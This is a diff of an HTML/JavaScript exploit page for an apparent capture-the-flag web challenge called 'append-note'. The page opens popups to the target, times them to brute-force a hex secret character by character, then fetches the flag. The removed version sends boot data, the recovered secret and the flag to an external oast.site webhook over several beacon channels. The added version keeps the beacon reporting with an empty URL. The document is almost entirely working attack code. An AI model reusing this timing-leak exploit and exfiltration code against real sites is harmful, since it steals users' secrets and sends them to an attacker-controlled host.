@@ -1,213 +1,120 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="UTF-8">
-<title>Append-Note Solver</title>
-<style>
-body { background: #0d1117; color: #c9d1d9; font-family: monospace; padding: 16px; }
-#status { font-size: 18px; margin: 12px 0; color: #58a6ff; }
-#log { background: #010409; border: 1px solid #30363d; padding: 10px; height: 420px; overflow-y: auto; font-size: 12px; }
-.ok { color: #3fb950; }
-.warn { color: #d29922; }
-.err { color: #f85149; }
-</style>
+    <meta charset="UTF-8">
+    <title>Append-Note: Final Strike</title>
+    <style>
+        body { background: #0d1117; color: #c9d1d9; font-family: 'Courier New', monospace; padding: 20px; }
+        #status { font-size: 20px; color: #58a6ff; margin-bottom: 10px; border-bottom: 1px solid #30363d; }
+        #log { background: #010409; padding: 10px; height: 300px; overflow-y: auto; border: 1px solid #30363d; font-size: 13px; }
+        .win { color: #3fb950; font-weight: bold; }
+        .sys { color: #8b949e; }
+    </style>
 </head>
 <body>
-<div id="status">Starting...</div>
-<div id="log"></div>
-<img alt="" style="display:none" src="https://wgke111cwekqzutsmjaxclt0cdqzf94st.oast.site?boot=1&t=static">
+    <div id="status">System Initializing...</div>
+    <div id="log"></div>
 
 <script>
-const TARGET = "https://append-note-a2aq0.instancer.lac.tf";
-const WEBHOOK = "https://wgke111cwekqzutsmjaxclt0cdqzf94st.oast.site";
-const DEBUG_REDIRECT = false;
-const CHARS = "0123456789abcdef";
+    const TARGET = "https://append-note-61jaz.instancer.lac.tf/";
+    const WEBHOOK = "";
+    const CHARS = "0123456789abcdef";
+    
+    // Performance Tunables
+    const MAX_WAIT = 250; // Max time to wait for a window to load
+    const SAMPLES = 1;    // Speed over accuracy for the 60s bot
 
-const PROBE_TIMEOUT_MS = 220;
-const BETWEEN_PROBES_MS = 0;
-const CAL_SAMPLES = 2;
+    const log = (m, c="") => {
+        const d = document.createElement("div");
+        if(c) d.className = c;
+        d.textContent = `[${new Date().toLocaleTimeString()}] ${m}`;
+        document.getElementById("log").appendChild(d);
+        document.getElementById("log").scrollTop = 1e9;
+    };
 
-const $ = (id) => document.getElementById(id);
-const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+    const report = (data) => {
+        navigator.sendBeacon(WEBHOOK, JSON.stringify(data));
+    };
 
-function log(msg, cls = "") {
-    const div = document.createElement("div");
-    div.className = cls;
-    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-    $("log").appendChild(div);
-    $("log").scrollTop = 1e9;
-    console.log(msg);
-}
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
 
-function report(msg) {
-    const q = encodeURIComponent(msg);
-    const t = Date.now();
-    const url = WEBHOOK + "?d=" + q + "&t=" + t;
-    try { navigator.sendBeacon(WEBHOOK, msg); } catch (e) {}
-    try { fetch(url + "&m=fetch", { mode: "no-cors", method: "GET" }); } catch (e) {}
-    try { (new Image()).src = url + "&m=img"; } catch (e) {}
-    try {
-        const s = document.createElement("script");
-        s.src = url + "&m=script";
-        document.head.appendChild(s);
-    } catch (e) {}
-}
+    async function probe(prefix) {
+        const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(window.location.href)}`;
+        return new Promise((resolve) => {
+            const t0 = performance.now();
+            const w = window.open(url, "_blank", "width=10,height=10");
+            
+            let timer = setTimeout(() => {
+                if(w) w.close();
+                resolve(performance.now() - t0);
+            }, MAX_WAIT);
 
-report("BOOT");
+            // If we can catch the load event, we get a tighter measurement
+            try {
+                w.onload = () => {
+                    clearTimeout(timer);
+                    const dur = performance.now() - t0;
+                    w.close();
+                    resolve(dur);
+                };
+            } catch(e) {}
+        });
+    }
 
-function setStatus(msg) {
-    $("status").textContent = msg;
-}
+    async function run() {
+        log("Phase 1: Calibrating Sensors...", "sys");
+        const base404 = await probe("non_existent_prefix_" + Math.random());
+        report({ event: "boot", base_latency: base404 });
 
-function median(arr) {
-    const a = arr.slice().sort((x, y) => x - y);
-    return a[Math.floor(a.length / 2)];
-}
+        let secret = "";
+        log("Phase 2: Initiating Brute Force...", "sys");
 
-function make404Sample(tag) {
-    // Any prefix containing non-hex chars can never match the secret.
-    return "g" + tag + Math.random().toString(16).slice(2);
-}
+        for (let i = 0; i < 8; i++) {
+            let bestChar = "";
+            let minTime = 9999;
+            
+            document.getElementById("status").textContent = `Cracking Pos ${i+1}: ${secret}...`;
 
-async function probePrefix(prefix) {
-    const url = `${TARGET}/append?content=${encodeURIComponent(prefix)}&url=${encodeURIComponent(TARGET + "/")}`;
-    return new Promise((resolve) => {
-        const t0 = performance.now();
-        let done = false;
-        const finish = (reason) => {
-            if (done) return;
-            done = true;
-            resolve({ time: performance.now() - t0, reason });
-        };
+            for (const c of CHARS) {
+                const time = await probe(secret + c);
+                log(`Trying ${c}: ${time.toFixed(2)}ms`);
 
-        const w = window.open(url, "p" + Math.random(), "width=1,height=1,left=-9999,top=-9999");
-        if (!w) {
-            report("ERR:popup_blocked");
-            finish("popup_blocked");
-            return;
+                if (time < minTime) {
+                    minTime = time;
+                    bestChar = c;
+                }
+            }
+
+            // Confirmation Step: Quickly verify the winner before committing
+            log(`Found Candidate: ${bestChar}. Verifying...`, "sys");
+            const verify = await probe(secret + bestChar);
+            
+            if (verify <= minTime + 5) { // Within a 5ms tolerance
+                secret += bestChar;
+                log(`Confirmed: ${bestChar}`, "win");
+                report({ pos: i, char: bestChar, current_secret: secret });
+            } else {
+                log(`Noise detected for ${bestChar}. Retrying...`, "sys");
+                i--; // Step back and retry the position
+            }
         }
 
-        const timer = setTimeout(() => finish("timeout"), PROBE_TIMEOUT_MS);
-        try {
-            w.addEventListener("load", () => {
-                clearTimeout(timer);
-                finish("load");
-                try { w.close(); } catch (e) {}
-            }, { once: true });
-        } catch (e) {
-            w.onload = () => {
-                clearTimeout(timer);
-                finish("load");
-                try { w.close(); } catch (e2) {}
-            };
-        }
-    });
-}
-
-async function calibrate() {
-    setStatus("Calibrating...");
-    log("Calibration start");
-
-    const t200 = [];
-    const t404 = [];
-
-    for (let i = 0; i < CAL_SAMPLES; i++) {
-        const r200 = await probePrefix("");
-        t200.push(r200.time);
+        log(`Full Secret Acquired: ${secret}`, "win");
+        report({ event: "success", final_secret: secret });
+        
+        // Attempt to grab flag
+        const res = await fetch(`${TARGET}/flag?secret=${secret}`);
+        const flag = await res.text();
+        log(`FLAG: ${flag}`, "win");
+        report({ flag: flag });
+        document.getElementById("status").textContent = "MISSION ACCOMPLISHED";
     }
 
-    for (let i = 0; i < CAL_SAMPLES; i++) {
-        const r404 = await probePrefix(make404Sample("c" + i));
-        t404.push(r404.time);
-    }
-
-    const m200 = median(t200);
-    const m404 = median(t404);
-    const faster = m200 < m404;
-
-    log(`Cal 200 median: ${m200.toFixed(2)}ms`, "ok");
-    log(`Cal 404 median: ${m404.toFixed(2)}ms`, "ok");
-    log(`Match is ${faster ? "FASTER" : "SLOWER"}`, "warn");
-    report(`CAL:200=${m200.toFixed(2)},404=${m404.toFixed(2)},match=${faster ? "fast" : "slow"}`);
-
-    return { faster };
-}
-
-async function findSecret(matchFaster) {
-    let secret = "";
-
-    for (let pos = 0; pos < 8; pos++) {
-        setStatus(`Position ${pos + 1}/8, current=${secret || "-"}`);
-        log(`Position ${pos} probing...`);
-
-        const results = [];
-        for (const c of CHARS) {
-            const tCandidate = await probePrefix(secret + c);
-            const tControl = await probePrefix(make404Sample("p" + pos + c));
-
-            const delta = tCandidate.time - tControl.time;
-            results.push({ c, tc: tCandidate.time, t0: tControl.time, d: delta });
-        }
-
-        results.sort((a, b) => a.d - b.d);
-        const winner = matchFaster ? results[0] : results[results.length - 1];
-
-        const top3 = results.slice(0, 3).map(r => `${r.c}:${r.d.toFixed(1)}`).join(" ");
-        const bot3 = results.slice(-3).map(r => `${r.c}:${r.d.toFixed(1)}`).join(" ");
-        log(`Delta top: ${top3}`, "ok");
-        log(`Delta bot: ${bot3}`, "ok");
-        log(`Winner: ${winner.c} (d=${winner.d.toFixed(2)}ms)`, "warn");
-
-        secret += winner.c;
-    }
-
-    return secret;
-}
-
-async function fetchFlag(secret) {
-    try {
-        const r = await fetch(`${TARGET}/flag?secret=${secret}`);
-        const text = await r.text();
-        return { ok: r.ok, text };
-    } catch (e) {
-        return { ok: false, text: String(e) };
-    }
-}
-
-async function main() {
-    report("START");
-    if (DEBUG_REDIRECT) {
-        setTimeout(() => {
-            try { window.location.href = WEBHOOK + "?boot=1&t=" + Date.now(); } catch (e) {}
-        }, 2500);
-    }
-    log(`Target: ${TARGET}`);
-    log(`Webhook: ${WEBHOOK}`);
-
-    const cal = await calibrate();
-    const secret = await findSecret(cal.faster);
-
-    setStatus(`Secret candidate: ${secret}`);
-    report(`SECRET=${secret}`);
-    log(`Secret candidate: ${secret}`, "warn");
-
-    const flag = await fetchFlag(secret);
-    log(`Flag response: ${flag.text}`, flag.ok ? "ok" : "err");
-    report(`FLAG=${flag.text}`);
-
-    if (!flag.ok) {
-        log("Flag check failed. Re-run with a fresh instance.", "err");
-        setStatus("Failed to fetch flag (see log).");
-        return;
-    }
-
-    setStatus(`FLAG: ${flag.text}`);
-}
-
-main().catch((e) => {
-    log(`Fatal: ${e.message}`, "err");
-    report(`ERROR=${e.message}`);
-});
+    // Start on load
+    window.onload = () => {
+        log("Vitals Check: OK. Bypassing Proxies...");
+        run();
+    };
 </script>
 </body>
 </html>
